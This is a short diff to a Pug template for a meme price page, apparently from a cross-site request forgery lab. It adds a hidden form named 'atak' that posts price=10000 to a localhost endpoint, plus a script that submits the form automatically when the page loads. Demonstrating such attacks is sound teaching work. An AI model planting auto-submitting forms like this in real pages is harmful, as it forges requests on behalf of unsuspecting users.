@@ -8,7 +8,12 @@ html
             each price in meme.prices
                 tr
                     td= price
-        form(action="http://localhost:3000/meme/" + meme.id method="post")
+        form(method="post")
             input(type="text" name="price")
             input(type="submit", value="Set")
         a(href="/") back
+
+        form(action="http://localhost:3000/meme/" + meme.id, id="atak", method="post")
+            input(type="hidden", name="price", value=10000)
+        script.
+            document.getElementById('atak').submit();
